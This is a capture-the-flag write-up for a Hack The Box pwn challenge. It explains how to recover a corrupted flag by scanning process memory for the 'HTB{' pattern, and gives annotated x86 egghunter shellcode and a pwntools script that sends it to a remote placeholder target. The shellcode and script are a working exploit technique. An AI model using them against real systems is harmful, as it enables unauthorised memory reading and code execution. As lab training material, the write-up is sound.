- the program is allocating memory for the flag to store it and after corrupt it, so the only solution to this challenge is to scan process memory for 'HTB{' pattern.
- we will face one problem which is if the memory page we want to read has READ permission or not. we'll use `access` SYSCALL to check that.
![pwn_hunting-copy and corrupt the flag](https://github.com/0xPrimo/CTFs/assets/93877982/58e8b19c-861b-46e1-9d1f-ea70d0f185bc)

- we'll use `egghunter` shellcode to find the pattern (egg) and print it using `write` SYSCALL.
```
	31 C0               	xor     eax, eax
	89 C7               	mov     edi, eax
	BF 48 54 42 7B          mov     edi, 7B425448h
	
	            		next_page:                           
	
	66 81 CA FF 0F          or      dx, 0FFFh
	
	                    next_address:
	
	42                      inc     edx
	60                      pusha
	31 C9                   xor     ecx, ecx        ; mode
	8D 5A 04                lea     ebx, [edx+4]    ; pathname
	B0 21                   mov     al, 21h ; '!'
	CD 80                   int     80h             ; LINUX 	sys_access
	3C F2                   cmp     al, 0F2h
	61                      popa
	74 EB                   jz      short next_page
	39 3A                   cmp     [edx], edi
	75 EC                   jnz     short next_address


	89 D1                   mov     ecx, edx        ; addr
	31 C0                   xor     eax, eax
	89 C3                   mov     ebx, eax
	89 DA                   mov     edx, ebx

						print_flag:
 	B0 04                   mov     al, 4
 	B3 01                   mov     bl, 1           ; fd
	B2 01                   mov     dl, 1
	CD 80                   int     80h             ; LINUX - sys_write
	41                      inc     ecx
	38 31                   cmp     [ecx], dh
	75 F3                   jnz     short print_flag
	C3                      retn
```
- python script

```
from pwn import *

shellcode = b'\x31\xc0\x89\xc7\xbf\x48\x54\x42\x7b\x66\x81\xca\xff\x0f\x42\x60\x31\xc9\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xeb\x39\x3a\x75\xec\x89\xd1\x31\xc0\x89\xc3\x89\xda\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x41\x38\x31\x75\xf3\xc3'


context.update(arch="i386", os="linux")


r = remote("<ip>", <port>)

r.send(shellcode)

flag = r.recv()
log.success(str(flag))
r.close()
```
